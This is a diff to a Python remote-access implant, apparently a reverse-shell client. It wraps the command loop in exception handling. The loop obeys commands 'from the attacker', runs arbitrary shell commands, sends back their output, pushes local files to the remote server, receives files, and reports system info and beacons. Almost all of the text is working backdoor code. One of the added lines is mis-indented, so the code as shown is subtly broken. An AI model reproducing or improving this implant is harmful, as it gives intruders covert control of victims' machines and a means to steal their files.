@@ -276,82 +276,88 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
         if VERBOSE:
             print(e)
     sock_desc_tracker = []
-    while True:
-        data = ""
-        while not data.endswith('[END]'):
-            if len(sock_desc_tracker) == 20:
-                if len(set(sock_desc_tracker)) == 1:
-                    if VERBOSE:
-                        print_fail("Lost Connection --> Count: {}".format(len(sock_desc_tracker)))
-                    raise ConnectionResetError
-            sock_desc_tracker.append(int(conn.fileno()))
-            recv = conn.recv(128)
-            recv_decoded = recv.decode('utf-8')
-            data = data + recv_decoded
-            if data:
-                sock_desc_tracker = []
-        data = data[:-5].strip('\n')
-        if VERBOSE:
-            print_info("Received:\n" + data)
-        if '[kill]' == data: # if we got terminate order from the attacker, close the socket and break the loop
-            kill_term(conn)
-            break
-        elif "[BEACON]" in data:
-            beacon(conn, data)
-        elif "[PORT]" in data:
-           callback_port(conn,data)
-        elif "[UUID]" in data:
-            push_uuid(conn)
-        elif "[get]" in data:  #find file locally then push to remote server
-            if VERBOSE:
-                print_info("Received GET")
-            file_name = data.split()[1].strip("[END]")
-            if path.exists(file_name):
-                file_transfer_get(conn, file_name)
-            else:
-                if VERBOSE:
-                    print_info("File not Found --> {}".format(file_name))
-                send_data(conn, "####FILE_#NOT#_FOUND####")
+    try:
+        while True:
             data = ""
-        elif "[put]" in data:
+            while not data.endswith('[END]'):
+                if len(sock_desc_tracker) == 20:
+                    if len(set(sock_desc_tracker)) == 1:
+                        if VERBOSE:
+                            print_fail("Lost Connection --> Count: {}".format(len(sock_desc_tracker)))
+                        raise ConnectionResetError
+                sock_desc_tracker.append(int(conn.fileno()))
+                recv = conn.recv(128)
+                recv_decoded = recv.decode('utf-8')
+                data = data + recv_decoded
+                if data:
+                    sock_desc_tracker = []
+            data = data[:-5].strip('\n')
             if VERBOSE:
-                print_info("Received PUT")
-            file_name = data.split()[2]
-            file_transfer_put(conn, file_name)
-        elif data == "sysinfo":
-            sys_info = sysinfo()
-            send_data(conn, sys_info)
-        else: # otherwise, we pass the received command to a shell process
-            #cmds = data.split()
-            if VERBOSE:
-                print_info("Received cmd --> {}".format(data))
-            if data.startswith("start "):
-                try:
-                    output = subprocess.call(data.split(" "), timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
-                    send_data(conn, "Command Successfully Executed (no output expected)") # send back the result
-                except subprocess.TimeoutExpired:
+                print_info("Received:\n" + data)
+            if '[kill]' == data: # if we got terminate order from the attacker, close the socket and break the loop
+                kill_term(conn)
+                break
+            elif "[BEACON]" in data:
+                beacon(conn, data)
+            elif "[PORT]" in data:
+            callback_port(conn,data)
+            elif "[UUID]" in data:
+                push_uuid(conn)
+            elif "[get]" in data:  #find file locally then push to remote server
+                if VERBOSE:
+                    print_info("Received GET")
+                file_name = data.split()[1].strip("[END]")
+                if path.exists(file_name):
+                    file_transfer_get(conn, file_name)
+                else:
                     if VERBOSE:
-                        print_warn("Command Execution Timeout Expired")
-                    send_data(conn, "Command Execution Timeout Expired")
-                
-            else:
-                try:
-                    output = subprocess.run(data, timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
-                    if output.stderr != b"":
-                        send_data(conn, output.stderr.decode('utf-8')) # send back the errors
-                    elif output.stdout == b"":
-                        send_data(conn, "ERROR --> {}".format(data))
-                    else:
-                        send_data(conn, output.stdout.decode('utf-8')) # send back the result
-                except subprocess.TimeoutExpired:
-                    if VERBOSE:
-                        print_warn("Command Execution Timeout Expired")
-                    send_data(conn, "Command Execution Timeout Expired")
-                except Exception as e:
-                    if VERBOSE:
-                        print_fail("Exception! --> {}".format(e))
-                    send_data(conn,e)
-            data = "" #reset the data received
+                        print_info("File not Found --> {}".format(file_name))
+                    send_data(conn, "####FILE_#NOT#_FOUND####")
+                data = ""
+            elif "[put]" in data:
+                if VERBOSE:
+                    print_info("Received PUT")
+                file_name = data.split()[2]
+                file_transfer_put(conn, file_name)
+            elif data == "sysinfo":
+                sys_info = sysinfo()
+                send_data(conn, sys_info)
+            else: # otherwise, we pass the received command to a shell process
+                #cmds = data.split()
+                if VERBOSE:
+                    print_info("Received cmd --> {}".format(data))
+                if data.startswith("start "):
+                    try:
+                        output = subprocess.call(data.split(" "), timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
+                        send_data(conn, "Command Successfully Executed (no output expected)") # send back the result
+                    except subprocess.TimeoutExpired:
+                        if VERBOSE:
+                            print_warn("Command Execution Timeout Expired")
+                        send_data(conn, "Command Execution Timeout Expired")
+                    
+                else:
+                    try:
+                        output = subprocess.run(data, timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
+                        if output.stderr != b"":
+                            send_data(conn, output.stderr.decode('utf-8')) # send back the errors
+                        elif output.stdout == b"":
+                            send_data(conn, "ERROR --> {}".format(data))
+                        else:
+                            send_data(conn, output.stdout.decode('utf-8')) # send back the result
+                    except subprocess.TimeoutExpired:
+                        if VERBOSE:
+                            print_warn("Command Execution Timeout Expired")
+                        send_data(conn, "Command Execution Timeout Expired")
+                    except Exception as e:
+                        if VERBOSE:
+                            print_fail("Exception! --> {}".format(e))
+                        send_data(conn,e)
+                data = "" #reset the data received
+    except Exception as e:
+        if VERBOSE:
+            print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+
 
 def query_beacon():
     global BEACON_INTERVAL_HDD
